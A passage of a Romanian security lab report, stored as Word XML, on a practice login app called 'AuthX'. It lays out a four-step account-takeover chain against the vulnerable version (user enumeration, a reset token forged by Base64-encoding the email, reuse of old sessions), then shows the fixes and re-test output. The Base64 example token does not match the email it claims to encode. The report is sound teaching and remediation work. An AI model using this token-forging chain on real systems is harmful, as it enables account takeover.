        <w:t>Vulnerabilitate 4.5 – Sesiuni nesigure:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ce poate obtine atacatorul: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- Impersonarea oricarui utilizator cunoscand ID-ul sau numeric.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- Prin XSS intr-o pagina terta: furt de cookie prin document.cookie.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- Mentinerea accesului dupa ce utilizatorul legitim a „iesit" din cont.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- Acces la resurse sensibile sau efectuare de actiuni in numele victimei.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabilitate 4.6 – Reset token nesigur:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ce poate obtine atacatorul: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- Preluarea completa a oricarui cont cunoscand doar adresa de email.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- Atacul nu necesita interactiunea victimei (nu trebuie sa dea click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pe un link malitios).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- Schimbarea parolei victimei fara ca aceasta sa realizeze imediat.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- Combinand 4.4 + 4.6: enumerare useri → calcul token → preluare cont.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>6.2 Scenariul de atac complet (attack chain)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Un atacator care ataca AuthX v1 poate parcurge urmatorii pasi:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 1 (Recunoastere – Vuln 4.4):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Prin user enumeration, confirma ca admin@authx.local exista.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 2 (Calcul token – Vuln 4.6A):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Calculeaza baza64 pt email-ul gasit. Nu necesita interactiunea cu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endpoint-ul /request-reset.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token = base64("admin@authx.local") = YWRtaW5AYXVfaHgubG9jYWw</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 3 (Preluare cont – Vuln 4.6A):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Trimite POST /reset-password cu token-ul calculat si o parola noua.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Contul admin este acum sub controlul atacatorului.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 4 (Mentinerea accesului – Vuln 4.5 + 4.6C):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Sesiunea veche a adminului este inca valida (ID numeric).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Token-ul de resetare nu a fost sters, poate fi reutilizat oricand.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Atacatorul genereaza un token nou, il salveaza pentru acces viitor.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Durata totala a atacului: sub 30 de secunde cu un script simplu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cunostinte necesare: adresa de email a victimei.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Detectabilitate in v1: ZERO (nu exista logging sau rate limiting).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>7. IMPLEMENTAREA FIX-URILOR (v2 – main_secure.py)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>7.1 FIX 4.1 – Politica de parola</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Implementare (main_secure.py):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def validate_password_strength(password: str) -&gt; bool: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if len(password) &lt; 8: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return False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if not re.search(r'[A-Z]', password):  # cel putin o litera mare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return False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if not re.search(r'[a-z]', password):  # cel putin o litera mica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return False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if not re.search(r'\d', password):       # cel putin o cifra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return False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if not re.search(r'[!@#$%^&amp;*()\-_=+\[\]{};:\'",.&lt;&gt;/?\\|`~]', password):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return False                          # cel putin un caracter special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return True</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Utilizare in /register si /reset-password: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if not validate_password_strength(user.password):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raise HTTPException(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status_code=400,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detail="Parola trebuie sa aiba minim 8 caractere, cel putin o litera mare, "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       "o litera mica, o cifra si un caracter special."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)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cerinte impuse: minim 8 caractere | litera mare | litera mica | cifra |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    caracter special din setul: !@#$%^&amp;*()-_=+[]{}...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>7.2 FIX 4.2 – Hash bcrypt cu salt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Implementare (main_secure.py):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import bcrypt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def hash_password(password: str) -&gt; str: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# bcrypt.gensalt() genereaza un salt unic 128-bit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# work factor implicit: 12 (2^12 = 4096 iteratii)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return bcrypt.hashpw(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password.encode('utf-8'),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bcrypt.gensalt()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).decode('utf-8')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def verify_password(password: str, stored_hash: str) -&gt; bool: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return bcrypt.checkpw(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password.encode('utf-8'),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stored_hash.encode('utf-8')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)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Diferente fata de MD5:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- bcrypt include salt-ul in hash (format: $2b$12$&lt;22 car. salt&gt;&lt;31 car. hash&gt;)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Calculul unui hash dureaza ~100ms pe CPU (impractical pentru brute force)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Doi utilizatori cu aceeasi parola au hash-uri DIFERITE (datorita salt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Work factor ajustabil: marim numarul pentru hardware mai puternic</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Exemplu bcrypt stocat vs MD5:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>MD5:    5f4dcc3b5aa765d61d8327deb882cf99  (32 hex, crack instant)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>bcrypt: $2b$12$VzBI57uiG48fm.lJ97/SvO...  (60 car., crack imposibil practic)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>7.3 FIX 4.3 – Rate limiting si blocare cont</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Implementare (main_secure.py):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MAX_LOGIN_ATTEMPTS = 5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LOCKOUT_MINUTES    = 15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def record_failed_attempt(email: str, conn):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cursor = conn.cursor()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cursor.execute("SELECT failed_attempts FROM users WHERE email = ?", (email,))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row = cursor.fetchone()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new_count = row['failed_attempts'] + 1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if new_count &gt;= MAX_LOGIN_ATTEMPTS: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lockout_until = datetime.now() + timedelta(minutes=LOCKOUT_MINUTES)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cursor.execute(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    "UPDATE users SET failed_attempts=?, locked=1, lockout_until=?"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    " WHERE email=?",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    (new_count, lockout_until.isoformat(), email)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else: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cursor.execute(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    "UPDATE users SET failed_attempts=? WHERE email=?",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    (new_count, email)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conn.commit()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# Audit log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cursor.execute(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"INSERT INTO audit_logs (user_id, action, resource) "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"SELECT id, 'FAILED_LOGIN', 'auth' FROM users WHERE email=?",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(email,)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conn.commit()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Logica in /login: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lockout_until = get_lockout_until(user.email, conn)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if lockout_until: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raise HTTPException(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status_code=429,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detail=f"Cont blocat pana la {lockout_until.strftime('%H:%M:%S')}. "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       "Prea multe incercari esuate."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)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Dupa 5 incercari esuate:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Contul este blocat 15 minute (camp lockout_until in DB)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Fiecare tentativa este logata in audit_logs cu actiunea 'FAILED_LOGIN'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- La login reusit, failed_attempts se reseteaza la 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>7.4 FIX 4.4 – Mesaj de eroare generic (anti User Enumeration)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Implementare (main_secure.py):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INVALID = "Credentiale invalide"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if not db_user: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conn.close()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raise HTTPException(status_code=401, detail=INVALID)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if not verify_password(user.password, db_user['password_hash']):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record_failed_attempt(user.email, conn)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conn.close()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raise HTTPException(status_code=401, detail=INVALID)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Modificari fata de v1:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Acelasi cod HTTP (401) indiferent de motiv (user inexistent / parola gresita).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Acelasi mesaj text ("Credentiale invalide") in ambele cazuri.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Nu exista nicio diferenta observabila in raspuns pentru atacator.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>7.5 FIX 4.5 – Sesiuni securizate</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Implementare (main_secure.py):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import secrets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def create_session(user_id, ip_address=None, user_agent=None):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session_token = secrets.token_urlsafe(32)  # 256 biti entropie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expires_at = datetime.now() + timedelta(hours=SESSION_HOURS)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cursor.execute(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"INSERT INTO sessions (user_id, session_token, expires_at, "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"ip_address, user_agent) VALUES (?, ?, ?, ?, ?)",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(user_id, session_token, expires_at.isoformat(), ip_address, user_agent)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return session_token</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Setare cookie in /login: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response.set_cookie(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key="session_id",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value=session_token,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httponly=True,        # inaccesibil din JS → anti-XSS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samesite="strict",    # neretrimis cross-origin → anti-CSRF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secure=False,         # True in productie (HTTPS)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max_age=SESSION_HOURS * 3600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)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Header Set-Cookie generat de v2:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>session_id=Fe7JL9a4...; HttpOnly; Max-Age=28800; Path=/; SameSite=strict</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Endpoint de logout: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@app.post("/logout")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def logout(response, session_id = Cookie(default=None)):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if session_id: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invalidate_session(session_id)   # DELETE FROM sessions WHERE token=?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response.delete_cookie("session_id")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return {"message": "Logout reusit!"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>7.6 FIX 4.6 – Token de resetare securizat (one-time + expirare)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Implementare (main_secure.py):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RESET_TOKEN_HOURS = 1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@app.post("/request-reset")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def request_password_reset(data: ResetRequest):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...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if user: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# Token criptografic random (nu Base64 de email)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token = secrets.token_urlsafe(32)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expires_at = datetime.now() + timedelta(hours=RESET_TOKEN_HOURS)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# Stergem orice token vechi pentru acelasi email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cursor.execute("DELETE FROM reset_tokens WHERE email=?", (data.email,))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cursor.execute(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    "INSERT INTO reset_tokens (email, token, expires_at) VALUES (?,?,?)",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    (data.email, token, expires_at.isoformat())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return {"message": "Daca emailul exista, s-a trimis un link."}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@app.post("/reset-password")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def reset_password(data: PasswordChange):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# Verificam token-ul SI expirarea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cursor.execute(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"SELECT email FROM reset_tokens "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"WHERE token=? AND expires_at &gt; datetime('now')",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(data.token,)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result = cursor.fetchone()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if not result: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raise HTTPException(400, "Token invalid sau expirat")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# Actualizam parola cu bcrypt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cursor.execute("UPDATE users SET password_hash=? WHERE email=?",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           (hash_password(data.new_password), email))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# Stergem token-ul dupa utilizare (one-time)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cursor.execute("DELETE FROM reset_tokens WHERE token=?", (data.token,))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Comparatie v1 vs v2 pentru resetare:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Caracteristica           v1 (vulnerabil)         v2 (securizat)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/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/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Generare token           Base64(email)           secrets.token_urlsafe(32)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Entropie token           0 (complet predictibil) 256 biti (imposibil de ghicit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Expirare                 Niciodata               1 ora</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Reutilizare              Nelimitata              One-time (sters dupa folosire)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabil la ghicire    DA                      NU</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F397D"/>
        </w:rPr>
        <w:t>8. RE-TEST – DOVADA CA ATACURILE NU MAI FUNCTIONEAZA</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Dupa implementarea fix-urilor in v2 (main_secure.py), rulam din nou scriptul</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>poc.py cu parametrul „v2":</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ python3 poc.py v2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output complet re-test: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############################################################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AuthX PoC - Ruleaza impotriva: v2 (SECURIZAT)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URL: http://127.0.0.1:8001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############################################################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[CLEANUP] Datele de test vechi au fost sterse.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[SETUP] Register admin@authx.local → 200 OK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[SETUP] Register victim@authx.local → 200 OK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[SETUP] Register tokentest@authx.local → 200 OK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[SETUP] Register bruteforce@authx.local → 200 OK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[4.1] Test: Politica Parola Slaba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[+] SECURIZAT (v2): Parola 'a' a fost RESPINSA (politica parola).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[+] SECURIZAT (v2): Parola '123' a fost RESPINSA (politica parola).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[+] SECURIZAT (v2): Parola 'abc123' a fost RESPINSA (politica parola).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[+] SECURIZAT (v2): Parola 'password' a fost RESPINSA (politica parola).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[4.2] Test: Stocare Nesigura a Parolelor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[+] SECURIZAT (v2): admin@authx.local → hash bcrypt: $2b$12$VzBI57...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[+] SECURIZAT (v2): victim@authx.local → hash bcrypt: $2b$12$KtrfaX...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[+] SECURIZAT (v2): tokentest@authx.local → hash bcrypt: $2b$12$4Bb0UG...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[+] SECURIZAT (v2): bruteforce@authx.local → hash bcrypt: $2b$12$Xv/pNd...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[4.3] Test: Brute Force impotriva bruteforce@authx.local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Incercare '123456': 401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Incercare '12345678': 401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Incercare 'admin': 401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Incercare 'authx123': 401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Incercare 'parola1': 401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[+] SECURIZAT (v2): Cont BLOCAT dupa prea multe incercari!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Raspuns: Cont blocat pana la 12:43:43. Prea multe incercari esuate.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[4.4] Test: User Enumeration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[+] SECURIZAT (v2): user EXISTENT → mesaj generic: 'Credentiale invalide'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[+] SECURIZAT (v2): user INEXISTENT → mesaj generic: 'Credentiale invalide'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[4.5] Test: Securitatea Cookie-ului de Sesiune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Cookie session_id: Fe7JL9a4XjdH7YD9-Ozqm5hQjKztjRXdeaSNB_Q4jKo...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[+] SECURIZAT (v2): Cookie este un token random opac (nu ID numeric).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Set-Cookie: session_id=...; HttpOnly; Max-Age=28800; Path=/; SameSite=strict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[+] SECURIZAT (v2): Cookie are atribut HttpOnly.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[+] SECURIZAT (v2): Cookie are atribut SameSite.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[4.6a] Test: Token de resetare predictibil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Token ghicit (Base64 email): dmljdGltQGF1dGh4LmxvY2Fs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[+] SECURIZAT (v2): Serverul a RESPINS tokenul fabricat (token random).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[4.6b] Test: Token de resetare reutilizabil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Token obtinut: sHRwYyER2x3URIbolXWNhip__dasM5...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Prima resetare: REUSITA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[+] SECURIZAT (v2): Token one-time! A doua utilizare a fost RESPINSA.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############################################################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PoC incheiat.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############################################################</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Tabel de verificare:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabilitate     Atac functioneaza in v1?  Atac blocat in v2?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/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6EB5"/>
        </w:rPr>
        <w:t>4.1 Parola slaba           DA                       DA (fix OK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.2 MD5 cracking           DA                       DA (fix OK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.3 Brute Force            DA (fara blocare)        DA (fix OK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.4 User Enumeration       DA (mesaje diferite)     DA (fix OK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.5 Sesiune predictibila   DA (cookie = ID)         DA (fix OK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>4.6a Token predictibil     DA (Base64 email)        DA (fix OK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>4.6b Token reutilizabil    DA (nelimitat)            DA (fix OK)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Concluzie re-test: TOATE vulnerabilitatile au fost remediate cu succes.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>9. AUDIT &amp; LOGGING – DEMONSTRAREA TRASABILITATII</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>9.1 Implementarea mecanismului de audit</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>In v2, toate tentativele esuate de autentificare sunt inregistrate in tabela</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>audit_logs. Aceasta tabela a fost definita in init_db.py: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CREATE TABLE IF NOT EXISTS audit_logs (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id          INTEGER PRIMARY KEY AUTOINCREMENT,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user_id     INTEGER,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action      TEXT NOT NULL,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resource    TEXT,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resource_id TEXT,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timestamp   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,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ip_address  TEXT,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FOREIGN KEY (user_id) REFERENCES users(id)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)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>9.2 Inregistrarea tentativelor esuate</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>In functia record_failed_attempt() din main_secure.py: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cursor.execute(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"INSERT INTO audit_logs (user_id, action, resource, ip_address) "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"SELECT id, 'FAILED_LOGIN', 'auth', NULL FROM users WHERE email=?",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(email,)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)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Aceasta inregistrare este executata de fiecare data cand un utilizator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>introdu credentiale gresite. La fiecare tentativa se salveaza:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- user_id: ID-ul utilizatorului vizat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- action:  'FAILED_LOGIN'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- resource: 'auth' (modulul de autentificare)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- timestamp: ora exacta a tentativei (automat, DEFAULT CURRENT_TIMESTAMP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- ip_address: adresa IP a clientului (disponibila prin request.client.host)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>9.3 Structura sesiunilor – audit implicit</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Tabela sessions asigura trasabilitate suplimentara:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Fiecare sesiune stocheaza ip_address si user_agent la momentul login.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- La logout, sesiunea este stearsa (nu invalida/pastrata pt audit).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Expirarile automate pot fi detectate comparand expires_at cu current_time.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Interogare audit – ultimele 10 tentative esuate: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SELECT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al.id,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u.email,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al.action,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al.timestamp,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al.ip_address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FROM audit_logs al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LEFT JOIN users u ON al.user_id = u.id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WHERE al.action = 'FAILED_LOGIN'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ORDER BY al.timestamp DESC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LIMIT 10;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
